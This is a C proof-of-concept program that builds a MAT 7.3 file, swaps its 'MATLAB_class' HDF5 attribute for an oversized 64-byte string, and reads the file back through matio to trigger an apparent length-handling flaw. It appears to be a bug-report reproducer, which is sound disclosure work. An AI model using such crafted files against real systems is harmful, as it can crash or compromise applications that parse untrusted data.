#include <matio.h>
#include <hdf5.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int
main(void)
{
    const char *path = "/tmp/matio_classlen_poc.mat";
    double value = 1.0;
    size_t dims[2] = {1, 1};
    mat_t *mat;
    matvar_t *matvar;
    hid_t file_id, dset_id, str_type, space_id, attr_id;
    char classbuf[64];
    mat_t *mat2;
    matvar_t *v;

    mat = Mat_CreateVer(path, NULL, MAT_FT_MAT73);
    if ( NULL == mat ) {
        fprintf(stderr, "failed to create mat file\n");
        return 1;
    }

    matvar = Mat_VarCreate("x", MAT_C_DOUBLE, MAT_T_DOUBLE, 2, dims, &value, 0);
    if ( NULL == matvar ) {
        fprintf(stderr, "failed to create variable\n");
        Mat_Close(mat);
        return 1;
    }

    if ( 0 != Mat_VarWrite(mat, matvar, MAT_COMPRESSION_NONE) ) {
        fprintf(stderr, "failed to write variable\n");
        Mat_VarFree(matvar);
        Mat_Close(mat);
        return 1;
    }

    Mat_VarFree(matvar);
    Mat_Close(mat);

    /* Replace the MATLAB_class attribute matio just wrote with an
     * otherwise well-formed fixed-length string attribute padded out to
     * 64 bytes. This is a plain HDF5 string attribute, same storage
     * class matio itself uses - just sized generously. */
    file_id = H5Fopen(path, H5F_ACC_RDWR, H5P_DEFAULT);
    if ( file_id < 0 ) {
        fprintf(stderr, "failed to reopen file with hdf5\n");
        return 1;
    }

    dset_id = H5Dopen(file_id, "x", H5P_DEFAULT);
    if ( dset_id < 0 ) {
        fprintf(stderr, "failed to open dataset\n");
        H5Fclose(file_id);
        return 1;
    }

    H5Adelete(dset_id, "MATLAB_class");

    str_type = H5Tcopy(H5T_C_S1);
    H5Tset_size(str_type, 64);
    H5Tset_strpad(str_type, H5T_STR_NULLTERM);

    space_id = H5Screate(H5S_SCALAR);
    attr_id = H5Acreate(dset_id, "MATLAB_class", str_type, space_id, H5P_DEFAULT, H5P_DEFAULT);

    memset(classbuf, 0, sizeof(classbuf));
    strcpy(classbuf, "double");
    H5Awrite(attr_id, str_type, classbuf);

    H5Aclose(attr_id);
    H5Sclose(space_id);
    H5Tclose(str_type);
    H5Dclose(dset_id);
    H5Fclose(file_id);

    /* Trigger: read the crafted file back through the public API. */
    mat2 = Mat_Open(path, MAT_ACC_RDONLY);
    if ( NULL == mat2 ) {
        fprintf(stderr, "failed to reopen mat file for reading\n");
        return 1;
    }

    v = Mat_VarReadNext(mat2);
    if ( NULL != v ) {
        Mat_VarFree(v);
    }

    Mat_Close(mat2);
    return 0;
}
